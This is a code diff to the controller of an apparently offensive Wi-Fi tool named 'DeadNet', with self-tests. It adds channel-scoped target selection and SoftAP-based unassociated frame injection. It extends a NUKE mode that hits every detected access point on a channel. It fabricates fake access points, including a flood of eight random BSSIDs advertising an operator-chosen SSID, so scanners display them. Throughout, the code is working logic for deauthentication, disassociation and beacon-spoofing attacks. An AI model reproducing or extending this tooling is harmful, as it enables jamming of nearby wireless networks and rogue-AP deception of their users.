@@ -48,8 +48,15 @@ from engine.attack import (
     build_spoof_set, mode_label, mode_desc, mode_knobs,
 )
 from engine.mgmt_tx import (
-    MgmtTxController, MgmtCtx, MgmtTarget, DEFAULT_FREQ, check_hexframe,
+    MgmtTxController, MgmtCtx, MgmtTarget, DEFAULT_FREQ, check_hexframe, norm_mac,
 )
+
+
+def _rand_la_mac() -> str:
+    """A random locally-administered, unicast MAC as 12 lowercase hex chars."""
+    import random
+    first = (random.randint(0, 255) & 0xfe) | 0x02   # clear mcast bit, set LA bit
+    return "%02x%s" % (first, "".join("%02x" % random.randint(0, 255) for _ in range(5)))
 
 DEADNET_PREF = "DeadNet"
 
@@ -99,6 +106,7 @@ class AppController:
 
         # --- operator state ---
         self.recon_channel: int = 6
+        self.attack_channel: int = 0   # 0 = none selected (selection requires a channel)
         self.selection_spec: str = ""
         self.spoof: List[MgmtTarget] = []          # resolved spoof set (the picks)
         self.attack_mode: int = 1                  # catalogue id (0 = NUKE)
@@ -113,6 +121,7 @@ class AppController:
         self.knob_hex: str = ""                    # custom frame (mode 12)
         self.knob_payload: str = ""                # action-frame body (8-10)
         self.knob_reason: int = 0                  # deauth/disassoc reason (0=default)
+        self.sap_enabled: bool = False             # use SAP + sysfs inject for unassociated TX
 
         self._attack_stop: Optional[threading.Event] = None
         self._attack_thread: Optional[threading.Thread] = None
@@ -201,24 +210,58 @@ class AppController:
         self.emit("target", mac=t.mac, kind=t.kind, ssid=t.ssid,
                   channel=t.channel, rssi=t.rssi)
 
-    def targets(self, kind: Optional[str] = None) -> List[dict]:
-        """Current recon inventory as dicts (APs + stations), RSSI-sorted."""
-        return [t.as_dict() for t in self.store.snapshot(kind)]
+    def targets(self, kind: Optional[str] = None, channel: Optional[int] = None) -> List[dict]:
+        """Current recon inventory as dicts (APs + stations), RSSI-sorted.
+        Filtered to `channel` (or self.attack_channel) when set."""
+        ch = self.attack_channel if channel is None else channel
+        snap = self.store.snapshot(kind)
+        if ch:
+            snap = [t for t in snap if getattr(t, "channel", 0) == ch]
+        return [t.as_dict() for t in snap]
 
     def clear_targets(self) -> None:
         self.store.clear()
         self.emit("targets_cleared")
 
+    def available_channels(self) -> List[int]:
+        """Distinct channels present in the current recon inventory."""
+        chs = {getattr(t, "channel", 0) for t in self.store.snapshot()}
+        return sorted(c for c in chs if c)
+
+    def set_attack_channel(self, channel: int) -> None:
+        try:
+            self.attack_channel = int(channel)
+        except (TypeError, ValueError):
+            self.attack_channel = 0
+        self.emit("attack_channel", channel=self.attack_channel)
+
+    def _targets_for_channel(self, kind=None, channel=None):
+        ch = self.attack_channel if channel is None else channel
+        out = self.store.snapshot(kind)
+        if ch:
+            out = [t for t in out if getattr(t, "channel", 0) == ch]
+        return out
+
     # =====================================================================
     # SELECT  (resolve a selection spec against the recon inventory)
     # =====================================================================
-    def set_selection(self, spec: str) -> int:
-        """Resolve a selection spec ('3' | '1,3' | 'S<glob>' | 'S~<ere>' | 'all')
-        against the recon inventory into the spoof set. Returns the count."""
+    def set_selection(self, spec: str, channel: Optional[int] = None) -> int:
+        """Resolve a selection spec against targets on the chosen channel.
+        `channel` (or self.attack_channel) is REQUIRED: selection is scoped to one
+        channel because the SAP channel-context serves one channel at a time.
+        Returns the count (0 if no channel is set)."""
+        if channel is not None:
+            self.set_attack_channel(channel)
         self.selection_spec = (spec or "").strip()
-        mts = [from_recon(t) for t in self.store.snapshot()]
+        if not self.attack_channel:
+            self.emit("error", msg="select a channel first")
+            self.spoof = []
+            return 0
+        cand = self._targets_for_channel(channel=self.attack_channel)
+        mts = [from_recon(t) for t in cand]
         self.spoof = select_spoof(mts, self.selection_spec, default_freq=DEFAULT_FREQ)
         self.emit("selection", spec=self.selection_spec, n=len(self.spoof),
+                  channel=self.attack_channel,
                   targets=[self._mt_dict(m) for m in self.spoof])
         return len(self.spoof)
 
@@ -273,6 +316,39 @@ class AppController:
         except (TypeError, ValueError):
             self.knob_reason = 0
 
+    def set_sap_enabled(self, on: bool) -> None:
+        self.sap_enabled = bool(on)
+        self.emit("sap", enabled=self.sap_enabled)
+
+    def start_sap(self, channel: Optional[int] = None) -> bool:
+        """Bring up a SoftAP channel-context (unassociated injection)."""
+        ch = channel if channel is not None else self.recon_channel
+        from engine.recon import channel_to_freq
+        # channel may be MHz or channel number; normalize to MHz best-effort
+        try:
+            ch = int(ch)
+        except (TypeError, ValueError):
+            ch = self.recon_channel
+        if ch and ch < 1000:
+            try:
+                ch = channel_to_freq(ch) or ch
+            except Exception:  # noqa: BLE001
+                pass
+        if not hasattr(self.tx, "enable_sap"):
+            return False
+        try:
+            return bool(self.tx.enable_sap(ch, iface=self.managed_iface))
+        except Exception as exc:  # noqa: BLE001
+            Logger.error(f"{DEADNET_PREF}: sap start failed: {exc}")
+            return False
+
+    def stop_sap(self) -> None:
+        if hasattr(self.tx, "disable_sap"):
+            try:
+                self.tx.disable_sap()
+            except Exception:  # noqa: BLE001
+                pass
+
     def _mgmt_ctx(self) -> MgmtCtx:
         """Build the MgmtCtx for a run from the current knobs."""
         return MgmtCtx(assoc_ssid=self.knob_ssid, fake=self.knob_fake,
@@ -316,10 +392,44 @@ class AppController:
     def _spoof_for_run(self) -> List[MgmtTarget]:
         if self.attack_mode == NUKE_MODE:
             # NUKE: wildcard over every detected AP (fall back to the picks).
-            mts = [from_recon(t) for t in self.store.snapshot("ap")]
+            mts = [from_recon(t) for t in self._targets_for_channel(kind="ap")]
             nuke = build_spoof_set(mts, "all", own_freq=self.recon_freq())
             return nuke or self.spoof
+        if self.attack_mode == 11 and not self.spoof:
+            # beacon / probe-resp spoof with no target: fabricate the AP itself.
+            return self._fabricate_beacon_aps()
         return list(self.spoof)
+
+    def _fabricate_beacon_aps(self) -> List[MgmtTarget]:
+        """A given BSSID (fake knob) -> one fake AP; blank -> a small flood of
+        random BSSIDs. All advertise the operator's SSID (via MgmtCtx), on the
+        STA's current operating channel so the beacon actually radiates there and
+        its DS Param Set IE matches (otherwise scanners filter it out)."""
+        if self.attack_channel:
+            from engine.recon import channel_to_freq
+            freq = channel_to_freq(self.attack_channel) or self._assoc_freq()
+        else:
+            freq = self._assoc_freq()
+        base = norm_mac(self.knob_fake)
+        if base:
+            return [MgmtTarget(base, "ap", freq, "fake AP", self.knob_ssid)]
+        return [MgmtTarget(_rand_la_mac(), "ap", freq, "fake AP", self.knob_ssid)
+                for _ in range(8)]
+
+    def _assoc_freq(self) -> int:
+        """Current operating freq (MHz) of the managed vif, else the recon/default
+        freq. An associated STA transmits on this channel regardless of the freq
+        we request, so beacons must advertise and target it."""
+        try:
+            import re
+            from engine import rootshell
+            out = rootshell.su_cp(f"iw dev {self.managed_iface} link", 6).stdout or ""
+            m = re.search(r"freq:\s*(\d+)", out)
+            if m:
+                return int(m.group(1))
+        except Exception:  # noqa: BLE001
+            pass
+        return self.recon_freq()
 
     def recon_freq(self) -> int:
         from engine.recon import channel_to_freq
@@ -348,6 +458,16 @@ class AppController:
             if not spoof:
                 self.emit("error", msg="no targets selected (pick from RECON, or use NUKE)")
                 return False
+            if self.sap_enabled:
+                ch = spoof[0].freq if spoof else self.recon_freq()
+                if hasattr(self.tx, "enable_sap"):
+                    try:
+                        if not self.tx.enable_sap(ch, iface=self.managed_iface):
+                            self.emit("error", msg="SAP start failed (hostapd)")
+                            return False
+                    except Exception as exc:  # noqa: BLE001
+                        self.emit("error", msg=f"SAP start failed: {exc}")
+                        return False
             plan = AttackPlan(
                 mode=self.attack_mode, spoof=spoof, iface=self.managed_iface,
                 pps=self.pps, budget=(self.budget if budget is None else int(budget)),
@@ -402,6 +522,8 @@ class AppController:
             self._attack_stop = None
             if back_to_recon and self._recon_on:
                 self._start_recon()
+            if not self.is_attacking():
+                self.stop_sap()
             self._emit_state()
 
     def state_metrics(self) -> dict:
@@ -444,6 +566,7 @@ class AppController:
             self._attack_stop = None
             self._recon_on = False
             self._stop_recon()
+            self.stop_sap()
             try:
                 self.tx.close()
             except Exception:  # noqa: BLE001
@@ -508,13 +631,19 @@ if __name__ == "__main__":
     assert ctl.state is AppState.RECON and scanners[0].started
     assert ctl.store.count("ap") == 2, ctl.store.count("ap")
 
-    # 3) SELECT: index + glob against the recon inventory
-    assert ctl.set_selection("all") == 2
+    # 3) SELECT: channel required, then targets on that channel only
+    assert ctl.set_selection("all") == 0, "no channel -> no selection"
+    ctl.set_attack_channel(6)
+    assert ctl.set_selection("all") == 1
     assert ctl.set_selection("SHome*") == 1 and ctl.spoof[0].ssid == "HomeNet"
-    assert ctl.set_selection("1,2") == 2
+    ctl.set_attack_channel(36)
+    assert ctl.set_selection("all") == 1
+    ctl.set_attack_channel(6)
+    assert ctl.set_selection("1") == 1
 
     # 4) ATTACK gated by CapGate; patched -> runs, stops the scan loop (no seize)
     ctl.set_mode(1); ctl.set_pps(200); ctl.budget = 10
+    ctl.set_attack_channel(6); ctl.set_selection("all")
     assert ctl.start_attack() is True
     ctl._attack_thread.join(timeout=3.0)
     assert scanners[0].stopped, "scan loop must stop before an attack burst"
@@ -529,7 +658,7 @@ if __name__ == "__main__":
     # 6) CapGate refusal on stock cfg80211 blocks ATTACK (no prior seize needed)
     ctl2 = AppController(tempfile.mkdtemp(), tx=FakeTx(), capgate=FakeCap(False),
                          recon_factory=fake_recon_factory, on_event=lambda k, d: None)
-    ctl2.own_recon(); ctl2.set_selection("all")
+    ctl2.own_recon(); ctl2.set_attack_channel(6); ctl2.set_selection("all")
     assert ctl2.start_attack() is False and ctl2.patched is False
 
     # 7) RELEASE -> ANDROID/idle, scan stopped, tx closed
